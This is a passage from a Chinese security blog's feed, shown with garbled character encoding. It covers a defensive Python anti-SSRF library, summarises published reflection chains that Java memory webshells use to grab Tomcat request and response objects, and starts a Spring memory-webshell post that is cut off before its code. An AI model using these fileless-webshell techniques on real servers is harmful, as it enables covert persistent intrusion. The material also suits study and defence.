Exception</span></span><br><span class="line">requests.get(<span class="string">&quot;http://10.10.10.10/&quot;</span>, anti_ssrf=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><a id="more"></a><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><ul><li>[1] <a href="https://www.leavesongs.com/PYTHON/defend-ssrf-vulnerable-in-python.html">è°ˆä¸€è°ˆå¦‚ä½•åœ¨Pythonå¼€å‘ä¸­æ‹’ç»SSRFæ¼æ´</a></li><li>[2] <a href="https://github.com/yangbh/pyAntiSSRF">pyAntiSSRF</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;å‘ç°å±…ç„¶æ²¡æœ‰ç‰¹åˆ«å¥½ç”¨çš„pythoné˜²å¾¡ssrfå¥½ç”¨çš„pipåº“ï¼Œé€ ä¸ªè½®å­&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;æ”¯æŒpipç®€å•å®‰è£…&lt;/li&gt;
&lt;li&gt;æ”¯æŒ py2&amp;amp;py3&lt;/li&gt;
&lt;li&gt;ç›´æ¥é€šè¿‡å‚æ•°å¼•ç”¨ï¼Œç›´æ¥hijackæœ€å¸¸ç”¨çš„requestsåº“ï¼Œä¸å¼•å…¥ç¬¬ä¸‰æ–¹å‡½æ•°&lt;/li&gt;
&lt;li&gt;æ”¯æŒé˜²å¾¡DNS rebinding&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;SSRFåŸç†åŠé˜²å¾¡&quot;&gt;&lt;a href=&quot;#SSRFåŸç†åŠé˜²å¾¡&quot; class=&quot;headerlink&quot; title=&quot;SSRFåŸç†åŠé˜²å¾¡&quot;&gt;&lt;/a&gt;SSRFåŸç†åŠé˜²å¾¡&lt;/h2&gt;&lt;p&gt;ssrfæ”»å‡»åŠé˜²å¾¡è¿™é‡Œä¸å»¶ä¼¸ï¼Œå¯å‚è€ƒã€1ã€‘ï¼Œpç¥è®²çš„æŒºæ˜ç™½äº†ï¼Œæä¸¤ç‚¹&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;åŸæ–‡æ²¡æ¶‰åŠåˆ°dns rebindingçš„é˜²å¾¡ï¼Œå…¶å®é˜²å¾¡æ€è·¯ä¹Ÿå¾ˆç®€å•ï¼Œåªè¿›è¡Œ1æ¬¡dnsè¯·æ±‚å³å¯&lt;/li&gt;
&lt;li&gt;å¾ªç¯hijack requestsè¿™ä¸ªæ€è·¯æåˆ°è¿‡ï¼Œä½†æ˜¯ä¸æ˜¯æœ€ä¼˜è§£ï¼Œå…¶å®ç›´æ¥hijack requests.sessions.Session.requestå³å¯ï¼Œæ‰€æœ‰çš„requests get/postæœ€ç»ˆéƒ½è°ƒç”¨çš„è¿™ä¸ªå‡½æ•°&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;å…·ä½“æ²¡å•¥å¯è¯´çš„ï¼Œçœ‹ä»£ç ã€2ã€‘å§&lt;/p&gt;
&lt;h2 id=&quot;ä½¿ç”¨&quot;&gt;&lt;a href=&quot;#ä½¿ç”¨&quot; class=&quot;headerlink&quot; title=&quot;ä½¿ç”¨&quot;&gt;&lt;/a&gt;ä½¿ç”¨&lt;/h2&gt;&lt;p&gt;&lt;code&gt;pip install pyAntiSSRF&lt;/code&gt;&lt;/p&gt;
&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# 1. import &amp;amp; patch requestsåº“&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; pyAntiSSRF&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;pyAntiSSRF.patchRequests()&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# 2. é€šè¿‡å‚æ•°anti_ssrfï¼ˆget/post/requestå‡½æ•°éƒ½æ”¯æŒï¼Œé»˜è®¤ä¸å¼€å¯ï¼‰ï¼Œæ§åˆ¶æ˜¯å¦å¼€å¯ssrfé˜²å¾¡ï¼Œå¦‚æœå¼€å¯ä¸”ç›®æ ‡ipæ˜¯å†…ç½‘ï¼Œåˆ™ä¼šæŠ›å‡ºå¼‚å¸¸&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; requests&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# custom requests usage&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;requests.get(&lt;span class=&quot;string&quot;&gt;&amp;quot;http://10.10.10.10/&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# patch requests by hijack requests.sessions.Session.request, default disable&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;requests.get(&lt;span class=&quot;string&quot;&gt;&amp;quot;http://10.10.10.10/&amp;quot;&lt;/span&gt;, anti_ssrf=&lt;span class=&quot;literal&quot;&gt;False&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# raise Exception&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;requests.get(&lt;span class=&quot;string&quot;&gt;&amp;quot;http://10.10.10.10/&amp;quot;&lt;/span&gt;, anti_ssrf=&lt;span class=&quot;literal&quot;&gt;True&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    <category term="Pythonå®‰å…¨" scheme="http://m0d9.me/categories/Python%E5%AE%89%E5%85%A8/"/>
    
    <category term="å·¥å…·" scheme="http://m0d9.me/categories/Python%E5%AE%89%E5%85%A8/%E5%B7%A5%E5%85%B7/"/>
    
    
    <category term="python" scheme="http://m0d9.me/tags/python/"/>
    
    <category term="ssrf" scheme="http://m0d9.me/tags/ssrf/"/>
    
    <category term="anti" scheme="http://m0d9.me/tags/anti/"/>
    
    <category term="tools" scheme="http://m0d9.me/tags/tools/"/>
    
    <category term="pip" scheme="http://m0d9.me/tags/pip/"/>
    
  </entry>
  
  <entry>
    <title>Javaå†…å­˜shellï¼šTomcatå›æ˜¾</title>
    <link href="http://m0d9.me/2020/10/10/Java%E5%86%85%E5%AD%98shell%EF%BC%9ATomcat%E5%9B%9E%E6%98%BE/"/>
    <id>http://m0d9.me/2020/10/10/Java%E5%86%85%E5%AD%98shell%EF%BC%9ATomcat%E5%9B%9E%E6%98%BE/</id>
    <published>2020-10-10T06:19:00.000Z</published>
    <updated>2020-10-14T02:56:48.519Z</updated>
    
    <content type="html"><![CDATA[<p>Tomcatå›æ˜¾ ä¸ Javaå†…å­˜shellæœ‰ä»€ä¹ˆå…³ç³»ï¼Ÿ</p><p>åœ¨javaæ¼æ´åˆ©ç”¨ä¸­å¦‚ä½•è·å–åˆ°æ‰§è¡Œç»“æœï¼Ÿè¿™æ˜¯Tomcatå›æ˜¾çš„æœ€åŸå§‹éœ€æ±‚ï¼Œå…·ä½“å¯ä»¥å‚è€ƒã€4ã€‘ä¸­çš„è®¸å¤šæ‰‹æ³•ï¼Œè¿™é‡Œä¸å±•å¼€</p><p>å…¶ä¸­æåˆ°ä¸€ç§æ€è·¯ï¼Œè·å–responseï¼Œç„¶åç›´æ¥æ“ä½œresponseä»¥httpå½¢å¼è¿”å›ã€‚è€ŒJavaå†…å­˜shellä¸­ï¼Œå¾ˆé‡è¦çš„ä¸€ç‚¹å°±æ˜¯è·å–requestä»è€Œè·å–ä¸Šä¸‹æ–‡cotextï¼Œå…¶ä¸­è·å–requestçš„æ€è·¯ç›¸ä¼¼é€šç”¨å¯å€Ÿé‰´ã€‚</p><h2 id="å†å²èƒŒæ™¯"><a href="#å†å²èƒŒæ™¯" class="headerlink" title="å†å²èƒŒæ™¯"></a>å†å²èƒŒæ™¯</h2><p>å‚è€ƒã€1ã€‘ä¸­æä¸‰å¸ˆå‚…æ€»ç»“äº†ä¹‹å‰æ¯”è¾ƒç»å…¸çš„tomcatå›æ˜¾æ–¹å¼ï¼Œå†™çš„å¾ˆå¥½ï¼Œç›´æ¥å¤ç”¨ï¼š</p><a id="more"></a><ul><li><a href="https://www.anquanke.com/post/id/198886">ã€ŠåŸºäºå†…å­˜ Webshell çš„æ— æ–‡ä»¶æ”»å‡»æŠ€æœ¯ç ”ç©¶ã€‹</a>ï¼Œè§‚æ˜Ÿå¤§å“¥çš„æ–‡ç« ï¼Œé€šæ€springï¼Œèƒ½è§£å†³å®æˆ˜åªèƒ½å¤Ÿé‡åˆ°çš„å¤§éƒ¨åˆ†æƒ…å†µäº†ã€‚</li><li><a href="https://xz.aliyun.com/t/7348">ã€ŠTomcatä¸­ä¸€ç§åŠé€šç”¨å›æ˜¾æ–¹æ³•ã€‹</a>ï¼Œkingkkå¸ˆå‚…çš„ï¼Œè¿™ç¯‡æ–‡ç« è®²äº†é€šè¿‡åå°„ä¿®æ”¹ApplicationFilterChainå‚æ•°æ¥è®©tomcatå†ä¸‹ä¸€æ¬¡è¯·æ±‚çš„æ—¶å€™åœ¨çº¿ç¨‹ä¸­ç¼“å­˜reqå’Œrespï¼Œä¸è¶³ä¹‹å¤„åœ¨äºshiroæ— æ³•å›æ˜¾ã€‚</li><li><a href="https://xz.aliyun.com/t/7388">ã€ŠåŸºäºtomcatçš„å†…å­˜ Webshell æ— æ–‡ä»¶æ”»å‡»æŠ€æœ¯ã€‹</a>ï¼Œthreedr3amå¸ˆå‚…çš„ï¼Œé€šè¿‡ä¸Šä¸€ç¯‡çš„æ–¹æ³•è·å–åˆ°reqè¿›ä¸€æ­¥è·å–contextï¼Œç„¶ååŠ¨æ€æ³¨å†Œfilterï¼Œä¸è¶³ä¹‹å¤„åœ¨äºä½¿ç”¨çš„æ˜¯ä¸Šä¸€ç¯‡çš„è·å–reqçš„æ€è·¯æ‰€ä»¥ä¹Ÿæ— æ³•shiroå›æ˜¾ã€‚</li><li><a href="https://mp.weixin.qq.com/s?__biz=MzIwNDA2NDk5OQ==&mid=2651374294&idx=3&sn=82d050ca7268bdb7bcf7ff7ff293d7b3">ã€ŠåŸºäºå…¨å±€å‚¨å­˜çš„æ–°æ€è·¯ | Tomcatçš„ä¸€ç§é€šç”¨å›æ˜¾æ–¹æ³•ç ”ç©¶ã€‹</a>ï¼Œè¿™ç¯‡æ–‡ç« é€šè¿‡currentThread.getContextClassLoader()è·å–StandardContextï¼Œè¿›ä¸€æ­¥è·å–åˆ°responseï¼Œè§£å†³äº†shiroå›æ˜¾çš„é—®é¢˜ï¼Œä¸è¶³åœ¨äºtomcat7ä¸­æ— æ³•è·å–åˆ°StandardContextã€‚</li><li><a href="https://mp.weixin.qq.com/s/whOYVsI-AkvUJTeeDWL5dA">ã€ŠåŸºäºTomcatæ— æ–‡ä»¶Webshellç ”ç©¶ã€‹</a>ï¼Œæ€»ç»“ä¸Šé¢æ–‡ç« çš„æ–¹æ³•ï¼Œä¸è¶³ä¹‹å¤„åœ¨äºæ— æ³•è§£å†³tomcat7+shiroçš„é—®é¢˜ã€‚</li></ul><p>ä¹‹åè¿˜æœ‰å‡ æ®µæœ‰æ„æ€çš„æ€è·¯ï¼š</p><ul><li><p><a href="https://xz.aliyun.com/t/7535">ã€Štomcatä¸å‡ºç½‘å›æ˜¾è¿ç»­å‰§ç¬¬å…­é›†ã€‹</a>ï¼Œè€Œæä¸‰å¸ˆå‚…åœ¨ä»¥ä¸Šçš„åŸºç¡€ä¸Šï¼Œæå‡ºäº†ä¸å‰æ–‡ä¸åŒçš„è·å–RequestInfoæ€è·¯ï¼Œæ˜¯ä¸€æ¡é€šè¿‡registry&amp;Mbeanå…¨æ–°çš„é“¾ï¼Œæ˜¯ç›®å‰è§åˆ°æœ€é€šç”¨çš„æ–¹å¼äº†ï¼Œé€‚åˆtomcat7&amp;shiroã€‚</p></li><li><p><a href="https://paper.seebug.org/1181/">ã€ŠåŠè‡ªåŠ¨åŒ–æŒ–æ˜ request å®ç°å¤šç§ä¸­é—´ä»¶å›æ˜¾ã€‹</a> ,c0ny1å¸ˆå‚…æå‡ºçš„ï¼Œè‡ªåŠ¨åŒ–éå†æœç´¢å…¨å±€requestï¼Œä¸€é”¤å®šéŸ³ï¼Œç®—æ˜¯Tomcatå›æ˜¾çš„ç»ˆç« äº†ã€‚</p></li></ul><p>ä»¥ä¸‹æ¥ä¸€ä¸€å¤ç°åˆ†æè¿™äº›æ–‡ç« æåˆ°çš„å§¿åŠ¿</p><h2 id="kingkkçš„ApplicationFilterChainåˆ©ç”¨é“¾"><a href="#kingkkçš„ApplicationFilterChainåˆ©ç”¨é“¾" class="headerlink" title="kingkkçš„ApplicationFilterChainåˆ©ç”¨é“¾"></a>kingkkçš„ApplicationFilterChainåˆ©ç”¨é“¾</h2><p>è¿™ä¸ªåº”è¯¥æ˜¯kingkkå¸ˆå‚…é¦–æ¬¡åœ¨å‚è€ƒã€5ã€‘ä¸­æåˆ°çš„æ–¹æ³•ï¼Œå‚è€ƒã€6ã€‘ä¸­ä½¿ç”¨çš„ä¹Ÿæ˜¯è¿™ä¸ªæ–¹æ³•</p><h3 id="åŸç†æ€è·¯"><a href="#åŸç†æ€è·¯" class="headerlink" title="åŸç†æ€è·¯"></a>åŸç†æ€è·¯</h3><p>å¼•ç”¨Litch1 çš„æ€»ç»“</p><blockquote><p>é€šè¿‡åå°„ä¿®æ”¹æ§åˆ¶å˜é‡ï¼Œæ¥æ”¹å˜Tomcatå¤„ç†è¯·æ±‚æ—¶çš„æµç¨‹ï¼Œä½¿å¾—Tomcatå¤„ç†è¯·æ±‚æ—¶ä¾¿å°†request,responseå­˜å…¥ThreadLocalä¸­ï¼Œæœ€ååœ¨ååºåˆ—åŒ–çš„æ—¶å€™ä¾¿å¯ä»¥åˆ©ç”¨ThreadLocalæ¥å–å‡ºresponseã€‚</p></blockquote><p>å‘ç°çš„è¿‡ç¨‹æ„Ÿè§‰å¾ˆç¥å¥‡:</p><p>ApplicationFilterChainæœ‰ä¸€ä¸ªé™æ€å‚æ•°ï¼ŒlastServicedRequestï¼Œç±»å‹ä¸ºThreadLocalï¼Œåœ¨ä¸€å®šæ¡ä»¶ä¸‹ä¼šä¿ç•™ä¸Šä¸€æ¬¡è®¿é—®çš„request</p><p><img src="/images/pasted-114.png" alt="upload successful"></p><p>æ”»å‡»æµç¨‹</p><ol><li><p>åå°„ä¿®æ”¹ApplicationDispatcher.WRAP_SAME_OBJECT ä¸ºtrue</p></li><li><p>internalDoFilterè¿›å…¥elseæµç¨‹ï¼Œåˆå§‹åŒ–lastServicedRequestå’ŒlastServicedResponseä¸¤ä¸ªå˜é‡</p></li><li><p>ä»lastServicedRequestä¸­è·å–å½“å‰è¯·æ±‚requestï¼Œä»è€Œè·å–åˆ°context<br> <img src="/images/pasted-116.png" alt="upload successful"></p></li></ol><p>å…¶ä¸­ä½¿ç”¨Javaåå°„æ›´æ”¹ç§æœ‰é™æ€finalå­—æ®µï¼ŒåŸç†è¯¦è§<a href="https://cloud.tencent.com/developer/ask/195780">https://cloud.tencent.com/developer/ask/195780</a></p><h2 id="Litch1çš„Thread-amp-StandardService-åˆ©ç”¨é“¾"><a href="#Litch1çš„Thread-amp-StandardService-åˆ©ç”¨é“¾" class="headerlink" title="Litch1çš„Thread&amp;StandardService åˆ©ç”¨é“¾"></a>Litch1çš„Thread&amp;StandardService åˆ©ç”¨é“¾</h2><p>å…¶å®ç›®çš„éƒ½æ˜¯ä¸ºäº†å¯»æ‰¾å­˜å‚¨äº†requestçš„å¯¹è±¡ï¼ŒLitch1åœ¨æ­¤åŸºç¡€ä¸Šæ‰‹åŠ¨è¿½æº¯äº†Tomcatå…¨å±€å­˜å‚¨ä¸­çš„requestã€‚</p><h3 id="åŸç†æ€è·¯-1"><a href="#åŸç†æ€è·¯-1" class="headerlink" title="åŸç†æ€è·¯"></a>åŸç†æ€è·¯</h3><p>è·Ÿè¸ªçš„è¿‡ç¨‹æ¯”è¾ƒå¤æ‚ï¼Œè€Œä¸”éœ€è¦å¯¹Tomcatå¯åŠ¨æµç¨‹è¦æœ‰ä¸€å®šäº†è§£ï¼Œè¯¦æƒ…è¿˜æ˜¯å‚è€ƒã€8ã€‘ï¼ˆç…§ç€è¿½äº†ä¸‹ï¼ŒçŸ¥å…¶ç„¶ä¸çŸ¥å…¶æ‰€ä»¥ç„¶ï¼Œå¯¹Tomcatè¿˜æ˜¯ä¸å¤Ÿäº†è§£ï¼‰</p><p>æœ€åçš„åˆ©ç”¨è·¯å¾„</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">WebappClassLoaderBase -&gt;</span><br><span class="line">ApplicationContext(getResources().getContext()) -&gt; </span><br><span class="line">StandardService -&gt;</span><br><span class="line">Connector#getProtocolHandler() -&gt;</span><br><span class="line">AbstractProtocol$ConnectoinHandler -&gt;</span><br><span class="line">                global -&gt;</span><br><span class="line">RequestInfo -&gt;</span><br><span class="line">Http11Processor#getRequest() -&gt; </span><br><span class="line">AbstractProcessor#getRequest() -&gt;</span><br><span class="line">Request#getResponse() -&gt;</span><br><span class="line">Response</span><br></pre></td></tr></table></figure><h2 id="æä¸‰å¸ˆå‚…çš„MBean-amp-Registryçš„åˆ©ç”¨é“¾"><a href="#æä¸‰å¸ˆå‚…çš„MBean-amp-Registryçš„åˆ©ç”¨é“¾" class="headerlink" title="æä¸‰å¸ˆå‚…çš„MBean&amp;Registryçš„åˆ©ç”¨é“¾"></a>æä¸‰å¸ˆå‚…çš„MBean&amp;Registryçš„åˆ©ç”¨é“¾</h2><h3 id="åŸç†æ€è·¯-2"><a href="#åŸç†æ€è·¯-2" class="headerlink" title="åŸç†æ€è·¯"></a>åŸç†æ€è·¯</h3><p>å‚è€ƒã€2ã€‘</p><p>ä¸ŠèŠ‚ä¸­ï¼Œæ˜¯é€šè¿‡Connectorå…¥æ‰‹æ‹¿åˆ°ProtocolHandlerã€‚å…¶å®å†ä»”ç»†çœ‹ä¸€ä¸‹Connectorç±»çš„ä¾èµ–æ ‘å°±å¯ä»¥å‘ç°å…¶å®æ‰€æœ‰çš„å‚æ•°å¹¶éæ˜¯å•ç‹¬å­˜æ”¾åœ¨è¿™äº›ç±»ä¸­çš„ä¸€ä¸ªå±æ€§ä¸­çš„ï¼Œè€Œæ˜¯éƒ½è¢«æ³¨å†Œåˆ°äº†MBeanServerä¸­çš„ï¼š</p><p>æœ€åçš„åˆ©ç”¨è·¯å¾„</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Registry.getRegistry(null, null).getMBeanServer() -&gt;</span><br><span class="line">JmxMBeanServer.mbsInterceptor -&gt;</span><br><span class="line">DefaultMBeanServerInterceptor.repository -&gt;</span><br><span class="line">Registory#query -&gt;</span><br><span class="line">RequestInfo -&gt;</span><br><span class="line">Http11Processor#getRequest() -&gt; </span><br><span class="line">AbstractProcessor#getRequest() -&gt;</span><br><span class="line">Request#getResponse() -&gt;</span><br><span class="line">Response</span><br></pre></td></tr></table></figure><h2 id="c0ny1çš„åŠè‡ªåŠ¨åŒ–æŒ–æ˜æ€è·¯"><a href="#c0ny1çš„åŠè‡ªåŠ¨åŒ–æŒ–æ˜æ€è·¯" class="headerlink" title="c0ny1çš„åŠè‡ªåŠ¨åŒ–æŒ–æ˜æ€è·¯"></a>c0ny1çš„åŠè‡ªåŠ¨åŒ–æŒ–æ˜æ€è·¯</h2><p>è¿™ä¸ªå½“å±å¤§ç‰›çº§æ€è·¯äº†ï¼Œäººå·¥åˆ†æè°ƒç”¨é“¾å¯èƒ½æœ‰ç–æ¼ï¼Œç›´æ¥å†…å­˜æœç´¢ç›¸å…³çš„å¯¹è±¡ï¼Œç®€å•ç›´æ¥ï¼Œå¯ä»¥è¯´æ˜¯ç»ˆç»“äº†å…¨å±€æœç´¢requestæ€è·¯ï¼ˆå½“ç„¶kingkkçš„æ”¹å˜äº†tomcatå¤„ç†æµç¨‹çš„é“¾æ˜¯æ‰¾ä¸åˆ°çš„ï¼‰ï¼Œè†œæ‹œã€‚</p><p>å…·ä½“å‚è€ƒã€7ã€‘ï¼Œä»£ç æ€è·¯åŸæ–‡éƒ½æŒºè¯¦ç»†ï¼Œå°±ä¸ç­é—¨å¼„æ–§äº†</p><h2 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h2><p>æœ¬æ–‡åªèƒ½ç®—æ˜¯å¯¹äºä»¥ä¸Šå¸ˆå‚…ä»¬æŒ–Tomcatå›æ˜¾æ–‡ç« çš„å­¦ä¹ æ€»ç»“ï¼Œä¸€ç¯‡ç¯‡æ–‡ç« è¯»æ¥ï¼Œæ„Ÿè§‰æœ‰å¸ˆå‚…ä»¬åœ¨åå±±è®ºå‰‘çš„å‘³é“ã€‚å§¿åŠ¿å›ºç„¶å¥‡å¦™ï¼Œæ›´å¥‡å¦™çš„æ˜¯å¸ˆå‚…ä»¬æ‰¾å„ç§çŒ¥çå§¿åŠ¿çš„æ€è·¯ï¼Œè·ç›ŠåŒªæµ…ã€‚</p><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><ul><li>[1] <a href="https://xz.aliyun.com/t/7535">tomcatä¸å‡ºç½‘å›æ˜¾è¿ç»­å‰§ç¬¬å…­é›†</a></li><li>[2] <a href="https://lucifaer.com/2020/05/12/Tomcat%E9%80%9A%E7%94%A8%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/">Tomcaté€šç”¨å›æ˜¾å­¦ä¹ </a></li><li>[3] <a href="https://www.cnblogs.com/potatsoSec/p/13060261.html">tomcatç»“åˆshiroæ— æ–‡ä»¶webshellçš„æŠ€æœ¯ç ”ç©¶ä»¥åŠæ£€æµ‹æ–¹æ³•</a></li><li>[4] <a href="https://l3yx.github.io/2020/03/31/Java-Web%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%9B%9E%E6%98%BE%E6%80%BB%E7%BB%93/">Java Webä»£ç æ‰§è¡Œæ¼æ´å›æ˜¾æ€»ç»“</a></li><li>[5] <a href="https://xz.aliyun.com/t/7348">Tomcatä¸­ä¸€ç§åŠé€šç”¨å›æ˜¾æ–¹æ³•</a></li><li>[6] <a href="https://xz.aliyun.com/t/7388#toc-1">åŸºäºtomcatçš„å†…å­˜ Webshell æ— æ–‡ä»¶æ”»å‡»æŠ€æœ¯</a></li><li>[7] <a href="https://paper.seebug.org/1181/">åŠè‡ªåŠ¨åŒ–æŒ–æ˜ request å®ç°å¤šç§ä¸­é—´ä»¶å›æ˜¾</a></li><li>[8] <a href="https://mp.weixin.qq.com/s?__biz=MzIwNDA2NDk5OQ==&mid=2651374294&idx=3&sn=82d050ca7268bdb7bcf7ff7ff293d7b3">åŸºäºå…¨å±€å‚¨å­˜çš„æ–°æ€è·¯ | Tomcatçš„ä¸€ç§é€šç”¨å›æ˜¾æ–¹æ³•ç ”ç©¶</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;Tomcatå›æ˜¾ ä¸ Javaå†…å­˜shellæœ‰ä»€ä¹ˆå…³ç³»ï¼Ÿ&lt;/p&gt;
&lt;p&gt;åœ¨javaæ¼æ´åˆ©ç”¨ä¸­å¦‚ä½•è·å–åˆ°æ‰§è¡Œç»“æœï¼Ÿè¿™æ˜¯Tomcatå›æ˜¾çš„æœ€åŸå§‹éœ€æ±‚ï¼Œå…·ä½“å¯ä»¥å‚è€ƒã€4ã€‘ä¸­çš„è®¸å¤šæ‰‹æ³•ï¼Œè¿™é‡Œä¸å±•å¼€&lt;/p&gt;
&lt;p&gt;å…¶ä¸­æåˆ°ä¸€ç§æ€è·¯ï¼Œè·å–responseï¼Œç„¶åç›´æ¥æ“ä½œresponseä»¥httpå½¢å¼è¿”å›ã€‚è€ŒJavaå†…å­˜shellä¸­ï¼Œå¾ˆé‡è¦çš„ä¸€ç‚¹å°±æ˜¯è·å–requestä»è€Œè·å–ä¸Šä¸‹æ–‡cotextï¼Œå…¶ä¸­è·å–requestçš„æ€è·¯ç›¸ä¼¼é€šç”¨å¯å€Ÿé‰´ã€‚&lt;/p&gt;
&lt;h2 id=&quot;å†å²èƒŒæ™¯&quot;&gt;&lt;a href=&quot;#å†å²èƒŒæ™¯&quot; class=&quot;headerlink&quot; title=&quot;å†å²èƒŒæ™¯&quot;&gt;&lt;/a&gt;å†å²èƒŒæ™¯&lt;/h2&gt;&lt;p&gt;å‚è€ƒã€1ã€‘ä¸­æä¸‰å¸ˆå‚…æ€»ç»“äº†ä¹‹å‰æ¯”è¾ƒç»å…¸çš„tomcatå›æ˜¾æ–¹å¼ï¼Œå†™çš„å¾ˆå¥½ï¼Œç›´æ¥å¤ç”¨ï¼š&lt;/p&gt;</summary>
    
    
    
    <category term="Javaå®‰å…¨" scheme="http://m0d9.me/categories/Java%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="Java" scheme="http://m0d9.me/tags/Java/"/>
    
    <category term="Tomcat" scheme="http://m0d9.me/tags/Tomcat/"/>
    
    <category term="å›æ˜¾" scheme="http://m0d9.me/tags/%E5%9B%9E%E6%98%BE/"/>
    
  </entry>
  
  <entry>
    <title>Javaå†…å­˜shellï¼šä¸‰æ–¹æ¡†æ¶</title>
    <link href="http://m0d9.me/2020/09/27/Java%E5%86%85%E5%AD%98shell%EF%BC%9A%E4%B8%89%E6%96%B9%E6%A1%86%E6%9E%B6/"/>
    <id>http://m0d9.me/2020/09/27/Java%E5%86%85%E5%AD%98shell%EF%BC%9A%E4%B8%89%E6%96%B9%E6%A1%86%E6%9E%B6/</id>
    <published>2020-09-27T02:06:00.000Z</published>
    <updated>2020-10-10T13:22:28.137Z</updated>
    
    <content type="html"><![CDATA[<p>å‰æ–‡tomcatçš„é€šç”¨servletå†…å­˜é©¬å·²ç»åŸºæœ¬å¯ä»¥è¦†ç›–å¤§éƒ¨åˆ†çš„æƒ…å†µï¼Œé’ˆå¯¹ç¬¬ä¸‰æ–¹æ¡†æ¶ï¼Œæ€è·¯ä¹Ÿæ˜¯ä¸€æ ·çš„ï¼Œå§¿åŠ¿ä¸åŒã€‚è§‚æ˜Ÿå®éªŒå®¤çš„å¸ˆå‚…ä»¬åœ¨å‚è€ƒã€1ã€‘ä¸­æåˆ°äº†å…³äºSpingçš„å§¿åŠ¿ï¼Œè¿™é‡Œå­¦ä¹ è®°å½•ä¸‹ã€‚</p><h2 id="Spring"><a href="#Spring" class="headerlink" title="Spring"></a>Spring</h2><p>å…·ä½“çš„èƒŒæ™¯ä¸èµ˜è¿°ï¼Œè¯¦è§å‚è€ƒã€1ã€‘ï¼Œå‡ ä¸ªé‡ç‚¹çš„æ­¥éª¤</p><ol><li>è·å¾—å½“å‰ä»£ç è¿è¡Œæ—¶çš„ä¸Šä¸‹æ–‡ç¯å¢ƒ</li><li>æ‰‹åŠ¨æ³¨å†Œ controller</li><li>controller ä¸­çš„ Webshell é€»è¾‘</li></ol><p>æ–‡ä¸­å¸ˆå‚…æ²¡æœ‰ç»™å‡ºç›´æ¥è¿è¡Œçš„pocï¼Œè¿™é‡Œç»™ä¸€ä¸‹</p><h3 id="Show-me-the-code"><a href="#Show-me-the-code" class="headerlink" title="Show 